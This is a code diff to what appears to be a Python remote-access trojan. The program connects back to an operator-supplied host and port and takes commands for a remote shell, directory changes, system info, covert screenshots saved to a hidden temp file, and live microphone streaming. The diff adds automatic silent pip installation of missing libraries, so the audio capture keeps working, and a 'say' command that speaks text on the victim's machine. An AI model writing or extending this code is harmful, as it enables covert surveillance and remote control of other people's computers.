@@ -15,9 +15,7 @@ import subprocess
 import os
 import sys
 import platform
-import platform
 import getpass
-import pyaudio
 
 from time import sleep
 import webbrowser as browser
@@ -30,6 +28,11 @@ if len(sys.argv) != 3:
 
 RHOST = sys.argv[1]
 RPORT = int(sys.argv[2])
+
+def install(package):
+    # It should bypass root and install required package for current user.
+    # If package will not be installed, command handler will call an error.
+    subprocess.check_call(["python3", "-m", "pip", "install", "--user", package])
 
 class handler:
     def __init__(self,sock):
@@ -101,8 +104,12 @@ def listen_audio():
     try:
         import pyaudio
     except:
-        unicorn.send("fail".encode("UTF-8"))
-        return
+        install("pyaudio")
+        try:
+            import pyaudio
+        except:
+            unicorn.send("fail".encode("UTF-8"))
+            return
     unicorn.send("success".encode("UTF-8"))
     CHUNK = 1024 * 4
     FORMAT = pyaudio.paInt16
@@ -132,6 +139,21 @@ def listen_audio():
                 p.terminate()
                 return
 
+def say_message(command):
+    try:
+        import pyttsx3
+    except:
+        install("pyttsx3")
+        try:
+            import pyttsx3
+        except:
+            unicorn.send("fail".encode("UTF-8"))
+            return
+    unicorn.send("success".encode("UTF-8"))
+    engine = pyttsx3.init()
+    engine.say("".join(command.split("say")).strip())
+    engine.runAndWait()
+            
 def screenshot():
     image = ImageGrab.grab()
     image.save("/tmp/.temp_screenshot.png", 'PNG')
@@ -199,6 +221,8 @@ def shell(handler=handler):
                         temp_directory = os.getcwd()
                         os.chdir(directory)
                         unicorn.send((I+"Changed to directory {}.".format(directory)).encode("UTF-8"))
+            elif ui[0] == "say":
+                say_message(command)
             elif ui[0] == "pwd":
                 unicorn.send(str(os.getcwd()).encode("UTF-8"))
             elif ui[0] == "sysinfo":
